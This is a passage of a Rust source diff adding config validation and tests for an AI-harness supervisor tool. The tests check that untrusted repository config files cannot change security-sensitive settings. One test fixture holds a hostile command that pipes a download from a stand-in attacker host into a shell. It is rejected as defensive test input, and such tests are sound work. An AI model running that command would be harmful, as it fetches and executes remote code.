+    validate_endpoint_base_url(key, &target.base_url)?;
+
+    if target.credential_env.is_empty()
+        || target.credential_env.contains('=')
+        || !target
+            .credential_env
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || c == '_')
+    {
+        return Err(format!(
+            "{key}: credential_env must be a non-empty environment variable NAME (ASCII \
+             letters, digits, underscore, never `=` or the secret itself), got \"{}\"",
+            target.credential_env
+        )
+        .into());
+    }
+
+    if let Some(wire_api) = target.wire_api.as_deref()
+        && wire_api != "chat"
+        && wire_api != "responses"
+    {
+        return Err(format!(
+            "{key}: wire_api must be \"chat\" or \"responses\", got \"{wire_api}\""
+        )
+        .into());
+    }
+
+    match target.model.as_deref() {
+        Some(model) => {
+            if !vendor.rungs.is_empty() && super::catalogue::rung_of(vendor, model).is_none() {
+                return Err(format!(
+                    "{key}: model \"{model}\" does not resolve (by alias or id) on vendor \
+                     \"{}\"'s catalogue ladder",
+                    target.vendor
+                )
+                .into());
+            }
+        }
+        None => {
+            if vendor.rungs.is_empty() {
+                return Err(format!(
+                    "{key}: model is required for vendor \"{}\", which has no catalogue rungs \
+                     to default from",
+                    target.vendor
+                )
+                .into());
+            }
+        }
+    }
+
+    Ok(())
+}
+
+/// Shared base-URL validation for harness overrides and native provider
+/// endpoints. The metacharacter rule lives in one place so the two config
+/// surfaces cannot drift.
+pub(crate) fn validate_endpoint_base_url(key: &str, base_url: &str) -> CtxResult<()> {
+    if !base_url.starts_with("http://") && !base_url.starts_with("https://") {
+        return Err(format!("{key}: base_url must be an http(s) URL, got \"{base_url}\"").into());
+    }
+    if let Some(bad) = base_url.chars().find(|c| {
+        c.is_whitespace()
+            || *c == '\''
+            || *c == '"'
+            || super::adapters::CMD_REPARSE_METACHARS.contains(c)
+    }) {
+        return Err(format!(
+            "{key}: base_url must not contain {bad:?} (it is passed to codex as a -c argv \
+             token)"
+        )
+        .into());
+    }
+    Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::collections::HashMap;
+
+    fn env_map(pairs: &[(&str, &str)]) -> HashMap<String, String> {
+        pairs
+            .iter()
+            .map(|(k, v)| ((*k).to_string(), (*v).to_string()))
+            .collect()
+    }
+
+    fn rust_sources_under(dir: &Path, into: &mut Vec<std::path::PathBuf>) {
+        let Ok(entries) = std::fs::read_dir(dir) else {
+            return;
+        };
+        for entry in entries.flatten() {
+            let path = entry.path();
+            if path.is_dir() {
+                rust_sources_under(&path, into);
+            } else if path.extension().is_some_and(|ext| ext == "rs") {
+                into.push(path);
+            }
+        }
+    }
+
+    /// Audit finding G3: two `agent.rs` tests set `ZIRV_CTX_PACE_FIVE_HOUR_
+    /// BUDGET_TOKENS` and `ZIRV_CTX_PACE_ESTIMATOR` -- names `ENV_MAP` had
+    /// never heard of, so the config they meant to pin stayed at its default
+    /// and the test passed without exercising the branch it was written for.
+    /// A misspelt `ZIRV_CTX_PACE*` name is silent by construction (an
+    /// unmatched variable is simply ignored), so it needs a check rather than
+    /// a reviewer's memory. Scoped to `[pace]`'s own prefix and to quoted
+    /// string literals: doc comments legitimately wrap a name mid-word, and
+    /// several other families (`ZIRV_CTX_HANDOVER_<AGENT>_<TIER>`,
+    /// `ZIRV_CTX_POLICY_*`) are built by `format!` from a prefix rather than
+    /// written out, so a crate-wide scan would need an allow-list larger than
+    /// the property it proves.
+    #[test]
+    fn every_pace_env_name_referenced_in_the_crate_exists_in_env_map() {
+        // Assembled rather than written out, so this test's own pattern
+        // literal is not itself a hit when it scans this file.
+        let prefix = concat!("ZIRV_CTX_", "PACE");
+        let re = regex::Regex::new(&format!("\"({prefix}[A-Z0-9_]*)\"")).expect("regex");
+
+        let mut sources = Vec::new();
+        rust_sources_under(
+            &Path::new(env!("CARGO_MANIFEST_DIR")).join("src"),
+            &mut sources,
+        );
+        assert!(!sources.is_empty(), "no sources found to scan");
+
+        let mut unknown: Vec<String> = Vec::new();
+        for source in &sources {
+            let text = std::fs::read_to_string(source).expect("read source");
+            for capture in re.captures_iter(&text) {
+                let name = &capture[1];
+                if ENV_MAP.iter().any(|(variable, _, _)| *variable == name) {
+                    continue;
+                }
+                unknown.push(format!("{}: {name}", source.display()));
+            }
+        }
+        unknown.sort();
+        unknown.dedup();
+        assert!(
+            unknown.is_empty(),
+            "{prefix}* names that ENV_MAP would silently ignore: {unknown:?}"
+        );
+    }
+
+    /// SECURITY: `safety.sql` joins `safety.allow`/`safety.default`/
+    /// `safety.interactive_default` as operator-only. Turning the SQL
+    /// classifier off removes the `Ask` narrowing it applies to a write
+    /// statement that would otherwise reach the permissive interactive
+    /// default -- there is no narrowing reading of `off`.
+    #[test]
+    fn a_repo_ctx_toml_cannot_turn_the_sql_classifier_off() {
+        let repo = tempfile::tempdir().expect("repo");
+        let home = tempfile::tempdir().expect("home");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+        std::fs::write(
+            repo.path().join(".zirv/ctx.toml"),
+            "[safety]\nsql = \"off\"\n",
+        )
+        .expect("write");
+        let empty: HashMap<String, String> = HashMap::new();
+        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+            .expect_err("a repo may not set safety.sql");
+        assert!(
+            is_repo_forbidden(err.as_ref()),
+            "must be a security refusal: {err}"
+        );
+    }
+
+    #[test]
+    fn defaults_match_the_spec() {
+        let cfg = ScoreConfig::default();
+        assert_eq!(cfg.window, 10);
+        assert_eq!(cfg.min_turns, 10);
+        assert_eq!(
+            cfg.token_floor, None,
+            "absolute overrides are unset by default -- see rot::token_gates"
+        );
+        assert_eq!(cfg.token_ceiling, None);
+        assert_eq!(cfg.token_floor_ratio, 0.5);
+        assert_eq!(cfg.token_ceiling_ratio, 0.8);
+        assert_eq!(cfg.model_context_tokens, None);
+        assert_eq!(cfg.advise_at, 40);
+        assert_eq!(cfg.compact_at, 60);
+        assert_eq!(cfg.restart_at, 80);
+        assert_eq!(cfg.marker, "[zirv]");
+        assert_eq!(cfg.repetition_threshold, 3);
+        assert_eq!(
+            cfg.weight_tool_failure + cfg.weight_repetition + cfg.weight_marker,
+            100.0,
+            "weights must sum to 100 so an all-signals session can reach restart"
+        );
+        assert_eq!(WrapConfig::default().debounce_ms, 3000);
+        assert_eq!(SuperviseConfig::default().max_restarts, 2);
+        assert_eq!(SuperviseConfig::default().max_nudges, 3);
+        assert_eq!(
+            SuperviseConfig::default().max_heavy_operations,
+            1,
+            "issue #133: a single heavy operation at a time is the safe default"
+        );
+        assert_eq!(
+            SuperviseConfig::default().max_writers,
+            0,
+            "issue #338: 0 means no machine-wide cap, with per-tree exclusivity only"
+        );
+        assert_eq!(
+            SuperviseConfig::default().heavy_command_patterns,
+            Vec::<String>::new(),
+            "the built-in set is baked into permit::is_heavy, not duplicated here"
+        );
+        assert_eq!(
+            SuperviseConfig::default().idle_no_tool_secs,
+            450,
+            "issue #310: mirrors the Hermes reference's own _STALE_IDLE_SECONDS"
+        );
+        assert_eq!(
+            SuperviseConfig::default().in_tool_secs,
+            1200,
+            "issue #310: mirrors the Hermes reference's own _STALE_IN_TOOL_SECONDS"
+        );
+        assert_eq!(
+            SuperviseConfig::default().stall_grace_secs,
+            120,
+            "issue #310: mirrors the Hermes reference's own _STALL_GRACE_SECONDS"
+        );
+        assert_eq!(
+            SuperviseConfig::default().compact_stall_secs,
+            600,
+            "issue #379: roughly double the slowest compaction actually observed"
+        );
+        assert_eq!(
+            SuperviseConfig::default().chain_max_restarts,
+            3,
+            "issue #310: mirrors the Hermes reference's own DEFAULT_MAX_RESTARTS"
+        );
+        assert_eq!(
+            SuperviseConfig::default().loop_backoff_ceiling_secs,
+            900,
+            "issue #311: mirrors Hermes's own DEFAULT_SELF_PACED_CEILING_SECONDS"
+        );
+        assert_eq!(
+            SuperviseConfig::default().chain_max_gap_secs,
+            300,
+            "issue #310: mirrors the Hermes reference's own DEFAULT_MAX_GAP_SECONDS"
+        );
+        assert_eq!(
+            HandoffConfig::default().model,
+            None,
+            "per-adapter resolution now lives in resolve_distiller_model, not a hardcoded default"
+        );
+        assert_eq!(HandoffConfig::default().tail_items, 5);
+        assert_eq!(HandoffConfig::default().timeout_secs, 30);
+    }
+
+    #[test]
+    fn repo_file_overrides_defaults_and_env_overrides_repo() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+        std::fs::write(
+            repo.path().join(".zirv/ctx.toml"),
+            "[score]\nwindow = 4\nmarker = \"[repo]\"\n",
+        )
+        .expect("write");
+
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
+        assert_eq!(cfg.score.window, 4);
+        assert_eq!(cfg.score.marker, "[repo]");
+        assert_eq!(
+            cfg.score.token_ceiling_ratio, 0.8,
+            "untouched keys keep defaults"
+        );
+
+        let env = env_map(&[("ZIRV_CTX_WINDOW", "7"), ("ZIRV_CTX_MARKER", "[env]")]);
+        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
+        assert_eq!(cfg.score.window, 7);
+        assert_eq!(cfg.score.marker, "[env]");
+    }
+
+    /// Issue #312: `compact_advisory`'s two keys are repo-settable but
+    /// narrow-only in the "less eager" direction (see `CompactAdvisoryConfig`'s
+    /// own doc comment): a repo layer may raise either threshold, a repo value
+    /// below the operator's is ignored, and an env var still wins over the
+    /// home layer as the base the repo narrows from.
+    #[test]
+    fn compact_advisory_repo_layer_may_only_quieten_the_advisory() {
+        assert_eq!(CompactAdvisoryConfig::default().min_reclaim_tokens, 4096);
+        assert_eq!(CompactAdvisoryConfig::default().window_fraction, 0.6);
+        assert_eq!(narrow_compact_advisory_min_reclaim(4096, Some(2048)), 4096);
+        assert_eq!(narrow_compact_advisory_min_reclaim(4096, Some(8192)), 8192);
+        assert_eq!(narrow_compact_advisory_min_reclaim(4096, None), 4096);
+        assert_eq!(narrow_compact_advisory_window_fraction(0.6, Some(0.5)), 0.6);
+        assert_eq!(narrow_compact_advisory_window_fraction(0.6, Some(0.9)), 0.9);
+        assert_eq!(narrow_compact_advisory_window_fraction(0.6, None), 0.6);
+
+        let repo = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+        std::fs::write(
+            repo.path().join(".zirv/ctx.toml"),
+            "[compact_advisory]\nmin_reclaim_tokens = 2048\nwindow_fraction = 0.5\n",
+        )
+        .expect("write");
+
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
+        assert_eq!(
+            cfg.compact_advisory.min_reclaim_tokens, 4096,
+            "a repo checkout may not make the advisory fire more eagerly"
+        );
+        assert_eq!(cfg.compact_advisory.window_fraction, 0.6);
+
+        std::fs::write(
+            repo.path().join(".zirv/ctx.toml"),
+            "[compact_advisory]\nmin_reclaim_tokens = 16384\nwindow_fraction = 0.9\n",
+        )
+        .expect("write");
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
+        assert_eq!(cfg.compact_advisory.min_reclaim_tokens, 16384);
+        assert_eq!(cfg.compact_advisory.window_fraction, 0.9);
+
+        let env = env_map(&[
+            ("ZIRV_CTX_COMPACT_ADVISORY_MIN_RECLAIM_TOKENS", "32768"),
+            ("ZIRV_CTX_COMPACT_ADVISORY_WINDOW_FRACTION", "0.95"),
+        ]);
+        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
+        assert_eq!(cfg.compact_advisory.min_reclaim_tokens, 32768);
+        assert_eq!(cfg.compact_advisory.window_fraction, 0.95);
+    }
+
+    /// Issue #311: `supervise.loop_backoff_ceiling_secs` is repo-settable but
+    /// narrow-only in the OPPOSITE polarity from `compact_advisory` above --
+    /// lower is stricter here, the same shape as `verify_on_stop.max_nudges`
+    /// -- and an env var still wins over both layers as the final word.
+    #[test]
+    fn loop_backoff_ceiling_repo_layer_may_only_lower_it() {
+        assert_eq!(SuperviseConfig::default().loop_backoff_ceiling_secs, 900);
+        assert_eq!(narrow_loop_backoff_ceiling_secs(900, Some(1800)), 900);
+        assert_eq!(narrow_loop_backoff_ceiling_secs(900, Some(300)), 300);
+        assert_eq!(narrow_loop_backoff_ceiling_secs(900, None), 900);
+
+        let repo = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+        std::fs::write(
+            repo.path().join(".zirv/ctx.toml"),
+            "[supervise]\nloop_backoff_ceiling_secs = 3600\n",
+        )
+        .expect("write");
+
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
+        assert_eq!(
+            cfg.supervise.loop_backoff_ceiling_secs, 900,
+            "a repo checkout may not raise the ceiling past the operator's own"
+        );
+
+        std::fs::write(
+            repo.path().join(".zirv/ctx.toml"),
+            "[supervise]\nloop_backoff_ceiling_secs = 120\n",
+        )
+        .expect("write");
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
+        assert_eq!(cfg.supervise.loop_backoff_ceiling_secs, 120);
+
+        let env = env_map(&[("ZIRV_CTX_SUPERVISE_LOOP_BACKOFF_CEILING_SECS", "60")]);
+        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
+        assert_eq!(cfg.supervise.loop_backoff_ceiling_secs, 60);
+    }
+
+    /// Issue #412: `output.diff_max_bytes` is repo-settable but narrow-only,
+    /// the identical shape as `supervise.loop_backoff_ceiling_secs` above --
+    /// lower is stricter, and an env var still wins over both layers as the
+    /// final word.
+    #[test]
+    fn diff_max_bytes_repo_layer_may_only_lower_it() {
+        assert_eq!(OutputConfig::default().diff_max_bytes, 65536);
+        assert_eq!(narrow_diff_max_bytes(65536, Some(131072)), 65536);
+        assert_eq!(narrow_diff_max_bytes(65536, Some(2048)), 2048);
+        assert_eq!(narrow_diff_max_bytes(65536, None), 65536);
+
+        let repo = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+        std::fs::write(
+            repo.path().join(".zirv/ctx.toml"),
+            "[output]\ndiff_max_bytes = 999999\n",
+        )
+        .expect("write");
+
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
+        assert_eq!(
+            cfg.output.diff_max_bytes, 65536,
+            "a repo checkout may not raise the ceiling past the operator's own"
+        );
+
+        std::fs::write(
+            repo.path().join(".zirv/ctx.toml"),
+            "[output]\ndiff_max_bytes = 4096\n",
+        )
+        .expect("write");
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
+        assert_eq!(cfg.output.diff_max_bytes, 4096);
+
+        let env = env_map(&[("ZIRV_CTX_OUTPUT_DIFF_MAX_BYTES", "1024")]);
+        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
+        assert_eq!(cfg.output.diff_max_bytes, 1024);
+    }
+
+    /// Companion to the test above, for the token gate's own five keys
+    /// specifically: none of them may be set from a repo checkout at all
+    /// (issue #155, Phase 6b) -- see `REPO_FORBIDDEN`'s own comment on the
+    /// `score.token_floor` entry for why both the absolutes and the ratios
+    /// are blocked together.
+    #[test]
+    fn a_repo_ctx_toml_cannot_move_any_of_the_five_token_gate_keys() {
+        for repo_toml in [
+            "[score]\ntoken_floor = 50000\n",
+            "[score]\ntoken_ceiling = 900000\n",
+            "[score]\ntoken_floor_ratio = 0.9\n",
+            "[score]\ntoken_ceiling_ratio = 0.1\n",
+            "[score]\nmodel_context_tokens = 1000000\n",
+        ] {
+            let repo = tempfile::tempdir().expect("repo");
+            let home = tempfile::tempdir().expect("home");
+            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+            std::fs::write(repo.path().join(".zirv/ctx.toml"), repo_toml).expect("write");
+            let empty: HashMap<String, String> = HashMap::new();
+            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+                .expect_err(&format!("a repo may not set: {repo_toml}"));
+            assert!(
+                is_repo_forbidden(err.as_ref()),
+                "must be a security refusal for {repo_toml}: {err}"
+            );
+        }
+    }
+
+    /// The operator's own home layer -- unlike the repo layer above -- may
+    /// still set `token_floor`/`token_ceiling` as plain integers, and they
+    /// still parse: the type moved from `u64` to `Option<u64>`, but a
+    /// present value still deserializes to `Some`, so no existing operator
+    /// config breaks.
+    #[test]
+    fn an_operator_layer_still_parses_plain_integer_token_thresholds() {
+        let home = tempfile::tempdir().expect("home");
+        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
+        std::fs::write(
+            home.path().join(".zirv/ctx.toml"),
+            "[score]\ntoken_floor = 50000\ntoken_ceiling = 900000\n",
+        )
+        .expect("write");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        let repo = tempfile::tempdir().expect("repo");
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
+        assert_eq!(cfg.score.token_floor, Some(50_000));
+        assert_eq!(cfg.score.token_ceiling, Some(900_000));
+    }
+
+    /// Issue #395, item 5: a repository checkout may not set `[endpoint.*]`
+    /// at all -- choosing which vendor account a seat spends is the same
+    /// trust asymmetry `agent`/`handover.*` already hold to.
+    #[test]
+    fn a_repo_ctx_toml_cannot_set_an_endpoint_override() {
+        let repo = tempfile::tempdir().expect("repo");
+        let home = tempfile::tempdir().expect("home");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+        std::fs::write(
+            repo.path().join(".zirv/ctx.toml"),
+            "[endpoint.claude]\nvendor = \"zhipu\"\nbase_url = \"https://api.z.ai/api/anthropic\"\ncredential_env = \"ZHIPU_API_KEY\"\n",
+        )
+        .expect("write");
+        let empty: HashMap<String, String> = HashMap::new();
+        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+            .expect_err("a repo may not set [endpoint.*]");
+        assert!(
+            is_repo_forbidden(err.as_ref()),
+            "must be a security refusal: {err}"
+        );
+    }
+
+    /// Issue #395, item 5 (operator half): the identical table loads fine
+    /// from the operator's own home layer.
+    #[test]
+    fn an_operator_endpoint_override_loads_from_the_home_layer() {
+        let home = tempfile::tempdir().expect("home");
+        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
+        std::fs::write(
+            home.path().join(".zirv/ctx.toml"),
+            "[endpoint.claude]\nvendor = \"zhipu\"\nbase_url = \"https://api.z.ai/api/anthropic\"\ncredential_env = \"ZHIPU_API_KEY\"\n",
+        )
+        .expect("write");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        let repo = tempfile::tempdir().expect("repo");
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
+        let target = cfg.endpoint.claude.expect("endpoint.claude must load");
+        assert_eq!(target.vendor, "zhipu");
+        assert_eq!(target.base_url, "https://api.z.ai/api/anthropic");
+        assert_eq!(target.credential_env, "ZHIPU_API_KEY");
+        assert_eq!(target.model, None);
+        assert_eq!(cfg.endpoint.codex, None);
+    }
+
+    /// Issue #395, item 6: every load-time validation error `validate_
+    /// endpoint_target` can raise, each named clearly enough to fix without
+    /// re-reading the source.
+    #[test]
+    fn endpoint_validation_rejects_every_documented_shape() {
+        let cases: &[(&str, &str)] = &[
+            (
+                "[endpoint.claude]\nvendor = \"no-such-vendor\"\nbase_url = \"https://x\"\ncredential_env = \"X\"\n",
+                "not a catalogue vendor",
+            ),
+            (
+                "[endpoint.claude]\nvendor = \"zhipu\"\nbase_url = \"ftp://x\"\ncredential_env = \"X\"\n",
+                "base_url must be an http(s) URL",
+            ),
+            (
+                "[endpoint.codex]\nvendor = \"deepseek\"\nbase_url = \"https://api.deepseek.com\"\ncredential_env = \"DEEPSEEK_API_KEY\"\nwire_api = \"grpc\"\n",
+                "wire_api must be",
+            ),
+            (
+                // ollama has no catalogue rungs at all, so `model` is required.
+                "[endpoint.claude]\nvendor = \"ollama\"\nbase_url = \"http://localhost:11434\"\ncredential_env = \"OLLAMA_KEY\"\n",
+                "model is required",
+            ),
+            (
+                "[endpoint.claude]\nvendor = \"zhipu\"\nbase_url = \"https://api.z.ai/api/anthropic\"\ncredential_env = \"ZHIPU_API_KEY\"\nmodel = \"claude-opus-5\"\n",
+                "does not resolve",
+            ),
+        ];
+        for (home_toml, expected_fragment) in cases {
+            let home = tempfile::tempdir().expect("home");
+            std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
+            std::fs::write(home.path().join(".zirv/ctx.toml"), home_toml).expect("write");
+            let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+            let repo = tempfile::tempdir().expect("repo");
+            let empty: HashMap<String, String> = HashMap::new();
+            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+                .expect_err(&format!("must be rejected: {home_toml}"));
+            assert!(
+                !is_repo_forbidden(err.as_ref()),
+                "a schema/validation error is not a REPO_FORBIDDEN rejection: {err}"
+            );
+            assert!(
+                err.to_string().contains(expected_fragment),
+                "expected {expected_fragment:?} in {err} (config: {home_toml})"
+            );
+        }
+    }
+
+    /// Issue #395: a rungless local-runtime vendor (`ollama`) accepts an
+    /// explicit `model` with no ladder to validate it against.
+    #[test]
+    fn endpoint_validation_accepts_an_explicit_model_for_a_rungless_vendor() {
+        let home = tempfile::tempdir().expect("home");
+        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
+        std::fs::write(
+            home.path().join(".zirv/ctx.toml"),
+            "[endpoint.claude]\nvendor = \"ollama\"\nbase_url = \"http://localhost:11434\"\ncredential_env = \"OLLAMA_KEY\"\nmodel = \"llama3.1\"\n",
+        )
+        .expect("write");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        let repo = tempfile::tempdir().expect("repo");
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
+        assert_eq!(
+            cfg.endpoint
+                .claude
+                .expect("endpoint.claude must load")
+                .model,
+            Some("llama3.1".to_string())
+        );
+    }
+
+    #[test]
+    fn numeric_looking_marker_stays_a_string() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        let env = env_map(&[("ZIRV_CTX_MARKER", "42")]);
+        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
+        assert_eq!(cfg.score.marker, "42");
+    }
+
+    #[test]
+    fn unknown_config_key_is_rejected_loudly() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+        std::fs::write(repo.path().join(".zirv/ctx.toml"), "[score]\nwindwo = 4\n").expect("write");
+        let empty = env_map(&[]);
+        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+            .expect_err("typo must not be silently ignored");
+        assert!(err.to_string().contains("windwo"), "got: {err}");
+    }
+
+    /// Cloning a repository must not be enough to choose what zirv executes.
+    #[test]
+    fn a_repository_config_cannot_name_what_the_tool_runs() {
+        for (toml, key) in [
+            ("agent_bin = \"/tmp/not-claude\"\n", "agent_bin"),
+            (
+                "[supervise]\non_failure = \"curl evil.example | sh\"\n",
+                "supervise.on_failure",
+            ),
+            ("[handoff]\nmodel = \"opus\"\n", "handoff.model"),
+            // Final wave item 1: `agent` reaches `resolve_default`'s
+            // *configured* arm, which never consults `disabled_only_by_
+            // repo` -- a repo checkout must not be able to pick which
+            // vendor account gets spent.
+            ("agent = \"codex\"\n", "agent"),
+        ] {
+            let repo = tempfile::tempdir().expect("tempdir");
+            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");
+
+            let empty = env_map(&[]);
+            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+                .expect_err("a repository must not be able to set this");
+            let msg = err.to_string();
+            assert!(msg.contains(key), "name the offending key: {msg}");
+            assert!(
+                msg.contains("repository config"),
+                "say why it was refused: {msg}"
+            );
+        }
+    }
+
+    /// The bug this module exists to fix: a stray keystroke in the untrusted
+    /// repo `ctx.toml` (`"1"` is not a table -- it is a bare TOML syntax
+    /// error) must not abort the whole load. `read_layer`/`CtxConfig::load`
+    /// skip the broken layer instead, so the rest of the config -- here, all
+    /// defaults, since there is no home layer -- still loads.
+    #[test]
+    fn a_repo_layer_with_a_toml_syntax_error_is_skipped_not_fatal() {
+        let repo = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+        std::fs::write(repo.path().join(".zirv/ctx.toml"), "1").expect("write");
+        let home = tempfile::tempdir().expect("tempdir");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+            .expect("a parse failure degrades, it does not abort the load");
+
+        assert_eq!(
+            cfg.score.window,
+            ScoreConfig::default().window,
+            "an unparsable repo layer contributes nothing; defaults apply"
+        );
+        assert_eq!(
+            cfg.unparsable_layers.len(),
+            1,
+            "{:?}",
+            cfg.unparsable_layers
+        );
+        let layer = &cfg.unparsable_layers[0];
+        assert_eq!(layer.path, repo.path().join(".zirv/ctx.toml"));
+        assert!(
+            layer.message.contains("line 1"),
+            "names the location: {}",
+            layer.message
+        );
+    }
+
+    /// Same fix, for the operator's own home layer: a hand-edit gone wrong
+    /// (an unterminated table header) must not brick every invocation either
+    /// -- the repo is not the only file a stray keystroke can land in.
+    #[test]
+    fn a_home_layer_with_a_truncated_table_is_skipped_not_fatal() {
+        let home = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
+        std::fs::write(home.path().join(".zirv/ctx.toml"), "[score\n").expect("write");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        let repo = tempfile::tempdir().expect("tempdir");
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+            .expect("a parse failure degrades, it does not abort the load");
+
+        assert_eq!(cfg.score.window, ScoreConfig::default().window);
+        assert_eq!(
+            cfg.unparsable_layers.len(),
+            1,
+            "{:?}",
+            cfg.unparsable_layers
+        );
+        assert_eq!(
+            cfg.unparsable_layers[0].path,
+            home.path().join(".zirv/ctx.toml")
+        );
+        assert!(
+            cfg.unparsable_layers[0].is_home,
+            "the home layer must be tagged as such"
+        );
+    }
+
+    /// Finding #1: `load_for_launch` is the entry point every verb that
+    /// actually launches or supervises a harness (chat/wrap/exec/loop/agent/
+    /// handover, and dash via wrap) must use instead of plain `load` -- a
+    /// broken HOME layer must refuse outright, naming the file, rather than
+    /// silently handing back permissive defaults right before a harness
+    /// spawns under them.
+    #[test]
+    fn load_for_launch_refuses_on_a_broken_home_layer() {
+        let home = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
+        std::fs::write(home.path().join(".zirv/ctx.toml"), "[score\n").expect("write");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        let repo = tempfile::tempdir().expect("tempdir");
+        let empty = env_map(&[]);
+        let err = CtxConfig::load_for_launch(repo.path(), &|k| empty.get(k).cloned())
+            .expect_err("a broken home layer must refuse a launching verb");
+        let msg = err.to_string();
+        assert!(
+            msg.contains(
+                &home
+                    .path()
+                    .join(".zirv")
+                    .join("ctx.toml")
+                    .display()
+                    .to_string()
+            ),
+            "names the file: {msg}"
+        );
+        assert!(msg.contains("line 1"), "keeps the location: {msg}");
+    }
+
+    /// The repo layer is untrusted, user-reported input -- unlike the home
+    /// layer, a syntax error there must still just skip and let a launching
+    /// verb proceed, exactly as plain `load` already does.
+    #[test]
+    fn load_for_launch_still_skips_a_broken_repo_layer() {
+        let home = tempfile::tempdir().expect("tempdir");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        let repo = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+        std::fs::write(repo.path().join(".zirv/ctx.toml"), "1").expect("write");
+
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load_for_launch(repo.path(), &|k| empty.get(k).cloned())
+            .expect("a broken repo layer must not block a launching verb");
+        assert_eq!(
+            cfg.unparsable_layers.len(),
+            1,
+            "{:?}",
+            cfg.unparsable_layers
+        );
+        assert!(!cfg.unparsable_layers[0].is_home);
+    }
+
+    /// Both layers broken at once must not compound into a harder failure --
+    /// `unparsable_layers` names both, and defaults alone govern the config.
+    #[test]
+    fn both_layers_broken_falls_back_to_defaults_only() {
+        let home = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
+        std::fs::write(home.path().join(".zirv/ctx.toml"), "not [ valid toml").expect("write");
+        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
+
+        let repo = tempfile::tempdir().expect("tempdir");
+        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
+        std::fs::write(repo.path().join(".zirv/ctx.toml"), "1").expect("write");
+
+        let empty = env_map(&[]);
+        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
+            .expect("both layers failing to parse still degrades, never aborts");
+
+        assert_eq!(cfg.score, ScoreConfig::default());
+        assert_eq!(cfg.pace.enabled, PaceConfig::default().enabled);
+        assert_eq!(cfg.sandbox.enabled, SandboxConfig::default().enabled);
